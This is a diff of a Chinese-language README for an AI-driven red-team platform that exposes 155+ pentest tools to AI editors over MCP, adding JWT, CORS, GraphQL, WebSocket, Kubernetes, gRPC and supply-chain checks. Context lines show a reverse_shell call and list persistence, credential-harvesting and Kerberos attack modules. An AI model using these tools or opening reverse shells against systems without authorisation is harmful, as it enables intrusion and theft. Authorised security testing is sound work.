@@ -6,7 +6,7 @@
   <img src="https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white" alt="Kali Linux"/>
   <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"/>
   <img src="https://img.shields.io/badge/MCP-Protocol-00ADD8?style=for-the-badge" alt="MCP"/>
-  <img src="https://img.shields.io/badge/Tools-100+-FF6B6B?style=for-the-badge" alt="Tools"/>
+  <img src="https://img.shields.io/badge/Tools-155+-FF6B6B?style=for-the-badge" alt="Tools"/>
   <img src="https://img.shields.io/badge/Payloads-2000+-orange?style=for-the-badge" alt="Payloads"/>
   <img src="https://img.shields.io/badge/AI-Powered-blueviolet?style=for-the-badge" alt="AI Powered"/>
   <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License"/>
@@ -20,7 +20,7 @@
 
 ## 📖 简介
 
-**AutoRedTeam-Orchestrator** 是一个集成了 **100+ 安全工具** 和 **2000+ Payload** 的智能化渗透测试平台。通过 MCP 协议与 AI 编辑器（Windsurf / Cursor / Claude Desktop / Kiro）无缝集成，实现 **AI 驱动的自动化红队作业**。
+**AutoRedTeam-Orchestrator** 是一个集成了 **155+ 安全工具** 和 **2000+ Payload** 的智能化渗透测试平台。通过 MCP 协议与 AI 编辑器（Windsurf / Cursor / Claude Desktop / Kiro）无缝集成，实现 **AI 驱动的自动化红队作业**。
 
 只需用自然语言描述目标，AI 就能自动选择工具、执行侦察、发现漏洞、推荐攻击路径。
 
@@ -305,6 +305,81 @@
 | 🔗 API提取 | `js_extract_apis` | 提取API端点和路由 |
 | 🔑 敏感信息 | `js_extract_secrets` | 提取密钥/Token/凭证 |
 
+### 🔐 v2.6 JWT安全检测 (JWT Security) 🆕
+
+| 工具 | 命令 | 功能描述 |
+|------|------|----------|
+| 🔓 None算法测试 | `jwt_none_algorithm_test` | JWT None算法签名绕过 |
+| 🔄 算法混淆测试 | `jwt_algorithm_confusion_test` | RS256→HS256算法混淆 |
+| 🔑 弱密钥测试 | `jwt_weak_secret_test` | 常见弱密钥爆破 |
+| 💉 KID注入测试 | `jwt_kid_injection_test` | KID参数路径遍历/SQL注入 |
+| 🔍 JWT完整扫描 | `jwt_full_scan` | 执行所有JWT安全测试 |
+
+### 🌐 v2.6 CORS安全检测 (CORS Security) 🆕
+
+| 工具 | 命令 | 功能描述 |
+|------|------|----------|
+| 🔓 CORS绕过测试 | `cors_bypass_test` | 30+种Origin绕过技术 |
+| 📋 预检请求测试 | `cors_preflight_test` | OPTIONS预检请求安全 |
+| 📊 安全头评分 | `security_headers_score` | OWASP安全头评分(A-F) |
+| 🔄 安全头对比 | `security_headers_compare` | 两个URL安全头对比 |
+| 📄 安全头报告 | `security_headers_report` | 详细安全头分析报告 |
+
+### 🔗 v2.6 GraphQL安全 (GraphQL Security) 🆕
+
+| 工具 | 命令 | 功能描述 |
+|------|------|----------|
+| 🔍 内省测试 | `graphql_introspection_test` | Schema泄露检测 |
+| 💣 批量DoS测试 | `graphql_batch_dos_test` | 批量查询限制检测 |
+| 📊 深层嵌套测试 | `graphql_deep_nesting_test` | 嵌套深度限制检测 |
+| 💡 字段建议测试 | `graphql_field_suggestion_test` | 字段建议信息泄露 |
+| 🔄 别名重载测试 | `graphql_alias_overload_test` | 别名数量限制检测 |
+| 🔍 GraphQL完整扫描 | `graphql_full_scan` | 执行所有GraphQL测试 |
+
+### 🔌 v2.6 WebSocket安全 (WebSocket Security) 🆕
+
+| 工具 | 命令 | 功能描述 |
+|------|------|----------|
+| 🔓 Origin绕过测试 | `websocket_origin_bypass_test` | Origin验证绕过 |
+| 🎯 CSWSH测试 | `websocket_cswsh_test` | 跨站WebSocket劫持 |
+| 🔑 认证绕过测试 | `websocket_auth_bypass_test` | 认证机制检测 |
+| 🗜️ 压缩攻击测试 | `websocket_compression_test` | CRIME漏洞检测 |
+| 🔍 WebSocket完整扫描 | `websocket_full_scan` | 执行所有WebSocket测试 |
+
+### 📦 v2.6 供应链安全 (Supply Chain Security) 🆕
+
+| 工具 | 命令 | 功能描述 |
+|------|------|----------|
+| 📋 SBOM生成 | `sbom_generate` | CycloneDX/SPDX物料清单 |
+| 📊 SBOM摘要 | `sbom_summary` | 依赖统计快速概览 |
+| 🔍 依赖审计 | `dependency_audit` | OSV漏洞数据库扫描 |
+| 🎯 单包检查 | `dependency_check_package` | 单个依赖包漏洞检查 |
+| 📄 依赖报告 | `dependency_report` | 详细漏洞扫描报告 |
+| 🔐 CI/CD扫描 | `cicd_security_scan` | GitHub Actions/GitLab CI安全 |
+| 🎯 Actions扫描 | `cicd_github_actions_scan` | GitHub Actions专项扫描 |
+| 📄 CI/CD报告 | `cicd_security_report` | CI/CD安全报告 |
+| 🔍 供应链完整扫描 | `supply_chain_full_scan` | 一键执行所有供应链检测 |
+
+### ☸️ v2.6 Kubernetes安全 (K8s Security) 🆕
+
+| 工具 | 命令 | 功能描述 |
+|------|------|----------|
+| 🔓 特权容器检测 | `k8s_privileged_check` | 特权容器和危险能力 |
+| 📁 HostPath检测 | `k8s_hostpath_check` | 危险宿主机路径挂载 |
+| 🔐 RBAC审计 | `k8s_rbac_audit` | 过度权限配置检测 |
+| 🌐 网络策略检查 | `k8s_network_policy_check` | NetworkPolicy缺失检测 |
+| 🔑 敏感信息检测 | `k8s_secrets_check` | 环境变量硬编码敏感信息 |
+| 📄 Manifest扫描 | `k8s_manifest_scan` | YAML配置文件安全扫描 |
+| 🔍 K8s完整扫描 | `k8s_full_scan` | 执行所有K8s安全检测 |
+
+### 🔗 v2.6 gRPC安全 (gRPC Security) 🆕
+
+| 工具 | 命令 | 功能描述 |
+|------|------|----------|
+| 🔍 反射API测试 | `grpc_reflection_test` | Schema泄露检测 |
+| 🔐 TLS配置测试 | `grpc_tls_test` | TLS加密配置检测 |
+| 🔓 认证绕过测试 | `grpc_auth_test` | 认证机制检测 |
+| 🔍 gRPC完整扫描 | `grpc_full_scan` | 执行所有gRPC测试 |
 
 ---
 
@@ -641,6 +716,10 @@ reverse_shell(type="python", lhost="10.0.0.1", lport=4444)
 - [x] 🆕 持久化模块 (Windows/Linux/Webshell)
 - [x] 🆕 凭证收集模块 (浏览器/WiFi/敏感文件)
 - [x] 🆕 AD域渗透模块 (LDAP枚举/Kerberos攻击)
+- [x] 🆕 JWT/CORS/安全头检测 (v2.6)
+- [x] 🆕 GraphQL/WebSocket安全 (v2.6)
+- [x] 🆕 供应链安全 (SBOM/CI-CD) (v2.6)
+- [x] 🆕 K8s/gRPC安全检测 (v2.6)
 - [ ] Web UI 界面
 - [ ] 分布式扫描支持
 - [ ] 更多云平台支持 (GCP/Alibaba Cloud)
@@ -649,6 +728,50 @@ reverse_shell(type="python", lhost="10.0.0.1", lport=4444)
 ---
 
 ## 📝 更新日志
+
+### v2.6.0 (2026-01-07)
+
+#### 🆕 API安全与云原生安全增强
+
+- **增强检测器模块** (`modules/enhanced_detector_tools.py`)
+  - JWT安全检测: None算法、算法混淆、弱密钥、KID注入
+  - CORS安全检测: 30+种Origin绕过技术、预检请求测试
+  - 安全头检测: OWASP标准评分、A-F等级、详细报告
+  - 新增 MCP 工具: `jwt_full_scan`, `cors_bypass_test`, `security_headers_score`
+
+- **API安全模块** (`modules/api_security_tools.py`)
+  - GraphQL安全: 内省泄露、批量DoS、深层嵌套、别名重载
+  - WebSocket安全: Origin绕过、CSWSH跨站劫持、认证绕过、CRIME压缩攻击
+  - 新增 MCP 工具: `graphql_full_scan`, `websocket_full_scan`
+
+- **供应链安全模块** (`modules/supply_chain_tools.py`)
+  - SBOM生成: CycloneDX 1.4/SPDX 2.3格式
+  - 依赖审计: 集成OSV漏洞数据库
+  - CI/CD安全: GitHub Actions/GitLab CI配置扫描
+  - 新增 MCP 工具: `sbom_generate`, `dependency_audit`, `cicd_security_scan`
+
+- **云安全模块** (`modules/cloud_security_tools.py`)
+  - K8s安全: 特权容器、HostPath、RBAC、NetworkPolicy、Secrets检测
+  - gRPC安全: 反射API、TLS配置、认证绕过
+  - 新增 MCP 工具: `k8s_full_scan`, `grpc_full_scan`
+
+- **响应过滤器** (`core/response_filter.py`)
+  - SPA误报检测: React/Vue/Angular/Next.js框架识别
+  - 基线校准: 自动获取404响应基线
+  - 内容去重: 避免重复报告相同内容
+  - 解决 `sensitive_scan` / `auth_bypass_detect` 误报问题
+
+#### 📦 文件变更
+- 新增: `modules/enhanced_detector_tools.py` (~300行)
+- 新增: `modules/api_security_tools.py` (~340行)
+- 新增: `modules/supply_chain_tools.py` (~480行)
+- 新增: `modules/cloud_security_tools.py` (~470行)
+- 新增: `core/response_filter.py` (~450行)
+- 修改: `mcp_stdio_server.py` (+新模块注册)
+
+#### 📊 工具数量更新
+- 总工具数: 100+ → **155+**
+- 新增工具类别: 8个
 
 ### v2.5.0 (2026-01-06)
 
